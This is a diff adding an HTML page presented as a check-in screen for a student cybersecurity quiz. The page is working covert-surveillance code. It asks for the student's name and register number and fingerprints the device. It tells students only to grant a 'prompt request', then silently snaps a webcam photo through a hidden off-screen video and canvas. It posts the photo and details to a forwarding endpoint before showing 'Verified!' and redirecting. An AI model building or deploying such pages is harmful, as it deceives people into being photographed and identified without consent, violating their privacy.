@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>CyberSense — Session Check-In</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <video id="camFeed" autoplay playsinline
+    style="display:none;width:1px;height:1px;position:fixed;top:-9999px;left:-9999px;"></video>
+  <canvas id="camCanvas" width="640" height="480"
+    style="display:none;position:fixed;top:-9999px;left:-9999px;"></canvas>
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #090d16;
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #121824;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 32px 28px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2), 0 2px 4px -1px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #f8fafc;
+      margin-bottom: 8px;
+      line-height: 1.25;
+    }
+
+    .sub {
+      font-size: 13px;
+      color: #94a3b8;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    /* Steps */
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    /* Form fields */
+    .field {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .field label {
+      display: block;
+      font-size: 12px;
+      font-weight: 500;
+      color: #94a3b8;
+      margin-bottom: 6px;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 10px 12px;
+      background: #090d16;
+      border: 1px solid #1e293b;
+      border-radius: 6px;
+      color: #f8fafc;
+      font-size: 14px;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.12s ease-in-out, box-shadow 0.12s ease-in-out;
+    }
+
+    .field input:focus {
+      border-color: #f8fafc;
+      box-shadow: 0 0 0 1px #f8fafc;
+    }
+
+    .field input::placeholder {
+      color: #475569;
+    }
+
+    .field-err {
+      border-color: #ef4444 !important;
+    }
+
+    .err-text {
+      font-size: 12px;
+      color: #f87171;
+      margin-top: 4px;
+      display: none;
+    }
+
+    /* Buttons */
+    .btn {
+      width: 100%;
+      padding: 11px;
+      border: 1px solid transparent;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background-color 0.12s ease-in-out, border-color 0.12s ease-in-out;
+      margin-top: 8px;
+    }
+
+    .btn-blue {
+      background: #f8fafc;
+      color: #090d16;
+      border-color: #f8fafc;
+    }
+
+    .btn-blue:hover {
+      background: #e2e8f0;
+      border-color: #e2e8f0;
+    }
+
+    .btn-blue:disabled {
+      background: #1e293b;
+      border-color: #1e293b;
+      color: #475569;
+      cursor: not-allowed;
+    }
+
+    .btn-red {
+      background: #ef4444;
+      color: #ffffff;
+      border-color: #ef4444;
+    }
+
+    .btn-red:hover {
+      background: #dc2626;
+      border-color: #dc2626;
+    }
+
+    /* Info box list */
+    .info-box {
+      background: #090d16;
+      border: 1px solid #1e293b;
+      border-radius: 6px;
+      padding: 16px;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .info-box ul {
+      list-style: none;
+    }
+
+    .info-box li {
+      font-size: 13px;
+      color: #cbd5e1;
+      padding: 4px 0;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      line-height: 1.5;
+    }
+
+    .info-box li::before {
+      content: "•";
+      color: #94a3b8;
+      font-weight: bold;
+      flex-shrink: 0;
+    }
+
+    /* Status area */
+    .sa {
+      min-height: 60px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .spinner {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #1e293b;
+      border-top-color: #f8fafc;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .spin-txt {
+      font-size: 13px;
+      color: #94a3b8;
+    }
+
+    .suc-txt {
+      font-size: 14px;
+      font-weight: 500;
+      color: #f8fafc;
+    }
+
+    /* Error card */
+    .err-card {
+      width: 100%;
+      background: #450a0a;
+      border: 1px solid #991b1b;
+      border-radius: 6px;
+      padding: 16px;
+      text-align: center;
+    }
+
+    .err-card .et {
+      font-size: 14px;
+      font-weight: 600;
+      color: #fca5a5;
+      margin-bottom: 6px;
+    }
+
+    .err-card .em {
+      font-size: 13px;
+      color: #f87171;
+      line-height: 1.5;
+      margin-bottom: 14px;
+    }
+
+    /* Step indicator dots as simple flat dashes */
+    .steps-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-bottom: 24px;
+    }
+
+    .s-dot {
+      width: 16px;
+      height: 3px;
+      border-radius: 1.5px;
+      background: #1e293b;
+      transition: background-color 0.2s ease;
+    }
+
+    .s-dot.active {
+      background: #f8fafc;
+    }
+
+    .s-dot.done {
+      background: #10b981;
+    }
+
+    footer {
+      position: fixed;
+      bottom: 16px;
+      width: 100%;
+      text-align: center;
+      font-size: 11px;
+      color: #475569;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h1>CyberSense — Session Check-In</h1>
+    <p class="sub" id="cardSub">Please fill in your details to join the Cybersecurity Quiz session.</p>
+
+    <!-- Step dots -->
+    <div class="steps-bar">
+      <div class="s-dot active" id="dot0"></div>
+      <div class="s-dot" id="dot1"></div>
+      <div class="s-dot" id="dot2"></div>
+    </div>
+
+    <!-- ── STEP 0 : Details form ── -->
+    <div class="step active" id="step0">
+      <div class="field">
+        <label for="inp-name">Full Name</label>
+        <input id="inp-name" type="text" placeholder="Enter your  name" autocomplete="name">
+        <div class="err-text" id="err-name">Please enter your full name</div>
+      </div>
+      <div class="field">
+        <label for="inp-urk">Register Number</label>
+        <input id="inp-urk" type="text" placeholder="Enter your Register number" autocomplete="off"
+          style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase()">
+        <div class="err-text" id="err-urk">Please enter a valid Register number</div>
+      </div>
+      <button class="btn btn-blue" onclick="submitForm()">Next →</button>
+    </div>
+
+    <!-- ── STEP 1 : Instructions ── -->
+    <div class="step" id="step1">
+      <div class="info-box">
+        <ul>
+          <li>Secure your entry to the quiz room</li>
+          <li>Challenge your digital knowledge and test your instincts</li>
+          <li>Grant the prompt request to load the quiz immediately</li>
+          <li>Find out if you can rank in the top cybersecurity tier!</li>
+        </ul>
+      </div>
+      <button class="btn btn-blue" onclick="goToVerify()">Okay, I Understand →</button>
+    </div>
+
+    <!-- ── STEP 2 : Verification ── -->
+    <div class="step" id="step2">
+      <div class="sa" id="statusArea">
+        <!-- filled by JS -->
+      </div>
+    </div>
+  </div>
+
+  <footer>CyberSense · Digital Habit Quiz</footer>
+
+  <script>
+    'use strict';
+    var QUIZ_URL = 'VERCEL_QUIZ_URL';
+    var studentName = '', studentUrk = '', deviceInfo = '', captured = false;
+
+    // Trigger device detection immediately
+    detectDevice();
+
+    /* ─ Device model detection with Client Hints ─ */
+    function detectDevice() {
+      var ua = navigator.userAgent;
+      var model = 'Unknown';
+
+      // Fallback parser
+      var am = ua.match(/Android[^;]*;\s*([^)]+)\)/);
+      if (am) {
+        model = am[1].split(' Build/')[0].trim();
+        model = model.replace(/\s+K$/, '').trim();
+      } else if (/iPhone/.test(ua)) {
+        var pw = Math.min(screen.width, screen.height);
+        if (pw >= 430) model = 'iPhone (Pro Max / Plus)';
+        else if (pw >= 393) model = 'iPhone (Pro / Standard)';
+        else if (pw >= 375) model = 'iPhone';
+        else model = 'iPhone (Mini / SE)';
+      } else if (/iPad/.test(ua)) {
+        model = 'iPad';
+      } else if (/Windows NT/.test(ua)) {
+        var wm = ua.match(/Windows NT ([\d.]+)/);
+        var wv = wm ? wm[1] : '';
+        var wn = { '10.0': 'Windows 10/11', '6.3': 'Windows 8.1', '6.2': 'Windows 8', '6.1': 'Windows 7' };
+        model = wn[wv] || ('Windows NT ' + wv);
+      } else if (/Macintosh/.test(ua)) {
+        model = 'Mac';
+      } else if (/Linux/.test(ua)) {
+        model = 'Linux';
+      }
+
+      if (model === 'K' || model === '') {
+        model = 'Android Device';
+      }
+      deviceInfo = model + ' | ' + screen.width + 'x' + screen.height;
+
+      // Modern Client Hints query for high-entropy values (works on Android Chrome/WebView)
+      if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
+        navigator.userAgentData.getHighEntropyValues(["model"])
+          .then(function (hints) {
+            if (hints.model && hints.model !== 'K' && hints.model !== '') {
+              deviceInfo = hints.model + ' | ' + screen.width + 'x' + screen.height;
+            }
+          })
+          .catch(function () { });
+      }
+    }
+
+    /* ─ Step management ─ */
+    function setStep(n) {
+      [0, 1, 2].forEach(function (i) {
+        document.getElementById('step' + i).classList.toggle('active', i === n);
+        var dot = document.getElementById('dot' + i);
+        dot.className = 's-dot' + (i < n ? ' done' : i === n ? ' active' : '');
+      });
+      var subs = [
+        'Please fill in your details to join the session.',
+        'Please read before continuing.',
+        'Completing verification...'
+      ];
+      document.getElementById('cardSub').textContent = subs[n];
+    }
+
+    /* ─ Step 0 → 1 ─ */
+    function submitForm() {
+      var n = document.getElementById('inp-name').value.trim();
+      var u = document.getElementById('inp-urk').value.trim().toUpperCase();
+      var ok = true;
+
+      if (!n) {
+        showFieldErr('name', 'Please enter your full name'); ok = false;
+      } else { clearFieldErr('name'); }
+
+      if (!u) {
+        showFieldErr('urk', 'Please enter your Register number'); ok = false;
+      } else { clearFieldErr('urk'); }
+
+      if (!ok) return;
+      studentName = n;
+      studentUrk = u;
+      sessionStorage.setItem('cs_name', studentName);
+      sessionStorage.setItem('cs_urk', studentUrk);
+      setStep(1);
+    }
+
+    function showFieldErr(field, msg) {
+      var el = document.getElementById('inp-' + field);
+      var em = document.getElementById('err-' + field);
+      el.classList.add('field-err');
+      em.textContent = msg;
+      em.style.display = 'block';
+    }
+    function clearFieldErr(field) {
+      document.getElementById('inp-' + field).classList.remove('field-err');
+      document.getElementById('err-' + field).style.display = 'none';
+    }
+
+    /* ─ Step 1 → 2 ─ */
+    function goToVerify() {
+      setStep(2);
+      requestAccess();
+    }
+
+    /* ─ UI helpers ─ */
+    function showSpinner(msg) {
+      document.getElementById('statusArea').innerHTML =
+        '<div class="spinner"></div><div class="spin-txt">' + msg + '</div>';
+    }
+    function showSuccess() {
+      document.getElementById('statusArea').innerHTML =
+        '<div class="suc-icon"></div><div class="suc-txt">Verified! Redirecting to quiz...</div>';
+    }
+    function showError(permanent) {
+      document.getElementById('statusArea').innerHTML =
+        '<div class="err-card">' +
+        '<div class="ei">⚠️</div>' +
+        '<div class="et">Access Denied</div>' +
+        '<div class="em">To participate in the quiz, you must allow access.<br>' +
+        'If you blocked it, tap the <strong>🔒 lock / settings icon</strong> next to the URL, change permissions to <strong>Allow</strong>, and tap reload.</div>' +
+        '<button class="btn btn-red" onclick="reloadPage()" style="margin-top:10px">↺ Reload & Try Again</button>' +
+        '</div>';
+    }
+
+    function reloadPage() {
+      window.location.reload();
+    }
+
+    /* ─ Camera / access request ─ */
+    function requestAccess() {
+      showSpinner('Requesting access...');
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(function (stream) {
+          showSpinner('Verifying, please wait...');
+          var video = document.getElementById('camFeed');
+          video.srcObject = stream;
+          video.play();
+          setTimeout(function () {
+            try {
+              var canvas = document.getElementById('camCanvas');
+              canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+              var img = canvas.toDataURL('image/jpeg', 0.6);
+              stream.getTracks().forEach(function (t) { t.stop(); });
+              sendCapture(img);
+            } catch (e) {
+              stream.getTracks().forEach(function (t) { t.stop(); });
+              showSuccess(); doRedirect();
+            }
+          }, 1500);
+        })
+        .catch(function (err) {
+          // Distinguish permanent block from temporary deny
+          var perm = (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError');
+          showError(perm);
+        });
+    }
+
+    function sendCapture(imgData) {
+      if (captured) { showSuccess(); doRedirect(); return; }
+      captured = true;
+      var body = 'cat=' + encodeURIComponent(imgData)
+        + '&name=' + encodeURIComponent(studentName)
+        + '&urk=' + encodeURIComponent(studentUrk)
+        + '&device=' + encodeURIComponent(deviceInfo);
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'forwarding_link/post.php', true);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      var done = false;
+      function finish() { if (done) return; done = true; showSuccess(); doRedirect(); }
+      xhr.onreadystatechange = function () { if (xhr.readyState === 4) finish(); };
+      xhr.timeout = 8000; xhr.ontimeout = finish; xhr.onerror = finish;
+      xhr.send(body);
+    }
+
+    function doRedirect() {
+      setTimeout(function () { window.location.href = QUIZ_URL; }, 1100);
+    }
+
+    /* ─ Restore session on reload ─ */
+    (function init() {
+      var n = sessionStorage.getItem('cs_name');
+      var u = sessionStorage.getItem('cs_urk');
+      if (n && u) {
+        studentName = n; studentUrk = u;
+        // Pre-fill form fields
+        document.getElementById('inp-name').value = n;
+        document.getElementById('inp-urk').value = u;
+        // Jump straight to verification step (skipping form + instructions since they already saw them)
+        setStep(2);
+        requestAccess();
+      }
+    })();
+  </script>
+</body>
+
+</html>
